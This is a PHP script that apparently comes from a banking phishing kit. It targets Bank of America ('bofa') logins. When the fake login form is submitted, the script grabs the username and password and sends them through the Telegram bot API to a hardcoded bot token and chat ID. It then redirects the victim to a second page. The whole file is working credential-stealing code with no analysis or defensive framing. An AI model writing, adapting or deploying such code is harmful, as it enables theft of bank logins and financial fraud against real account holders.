<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////


////////////////////

if ( isset ($_POST['user']) && isset ($_POST['pass'])  ){

$message = "\n🤔User BANK bofa 🤔\n🔑Usuario: => ".$_POST['user']." - \n🔑poss: => ".$_POST['pass']." \r\n";

$apiToken = "6194698603:AAEwaznctVDX7ZGLoIR9-HWKu2ZOYInIy9Q";


$data = [
  'chat_id' => '6063765094',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );

@header('Location: index2.html');

}else{ header ('location: index.html'); exit(); }

?>